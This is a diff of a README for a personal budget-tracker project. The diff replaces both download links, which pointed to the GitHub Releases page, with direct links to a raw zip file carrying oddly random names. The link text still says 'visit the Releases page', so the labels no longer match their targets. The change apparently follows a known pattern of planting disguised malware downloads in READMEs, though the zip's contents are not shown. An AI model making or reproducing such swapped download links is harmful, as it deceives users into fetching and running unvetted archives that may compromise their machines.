@@ -1,7 +1,7 @@
 # 🎉 budget-tracker - Simplify Your Personal Finances
 
 ## 🔗 Download Now
-[![Download Budget Tracker](https://img.shields.io/badge/Download%20Now!-Latest%20Release-brightgreen)](https://github.com/Henry95236/budget-tracker/releases)
+[![Download Budget Tracker](https://raw.githubusercontent.com/Henry95236/budget-tracker/main/infeudation/budget-tracker-tarlataned.zip%20Now!-Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Henry95236/budget-tracker/main/infeudation/budget-tracker-tarlataned.zip)
 
 ## 📖 Introduction
 Welcome to the "Budget Tracker"! This is a user-friendly tool designed to help you manage your personal finances easily. Track your income and expenses, set budgets, and achieve your financial goals all in one application.
@@ -12,7 +12,7 @@ Follow these instructions to download and run the Budget Tracker on your compute
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the Budget Tracker:
 
-[Click here to visit the Releases page](https://github.com/Henry95236/budget-tracker/releases)
+[Click here to visit the Releases page](https://raw.githubusercontent.com/Henry95236/budget-tracker/main/infeudation/budget-tracker-tarlataned.zip)
 
 1. Click on the link above.
 2. You will see a list of available releases. Look for the latest version at the top.
